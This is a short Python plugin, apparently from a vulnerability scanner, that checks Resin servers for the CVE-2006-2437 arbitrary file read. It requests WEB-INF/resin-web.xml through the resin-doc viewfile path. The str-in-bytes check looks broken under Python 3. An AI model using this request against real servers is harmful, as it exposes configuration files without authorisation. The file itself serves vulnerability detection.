import requests

from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Resin 任意文件读取漏洞 CVE-2006-2437"
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]
        self.app_name = "Resin"

    def verify(self, target):
        url = target + "/resin-doc/viewfile/?file=WEB-INF/resin-web.xml"
        resp = ""
        try:
            resp = requests.get(url).content
        except Exception:
            pass
        if 'xmlns="http://caucho.com/ns/resin"' in resp:
            self.logger.success("CVE-2006-2437 {}".format(url))
            return url
